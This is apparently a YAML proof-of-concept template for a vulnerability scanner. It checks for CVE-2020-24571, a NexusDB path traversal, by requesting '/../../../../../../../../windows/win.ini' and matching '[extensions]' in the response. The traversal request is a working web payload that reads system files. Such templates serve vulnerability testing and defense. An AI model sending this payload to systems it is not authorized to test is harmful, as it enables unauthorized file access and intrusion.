detail:
  author: su(https://suzzz112113.github.io/#blog)
  links:
  - https://www.nexusdb.com/mantis/bug_view_advanced_page.php?bug_id=2371
expression: r0()
manual: true
name: poc-yaml-nexusdb-cve-2020-24571-path-traversal
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(bytes("[extensions]"))
      && response.content_type.contains("application/octet-stream")
    request:
      cache: true
      follow_redirects: true
      method: GET
      path: /../../../../../../../../windows/win.ini
transport: http
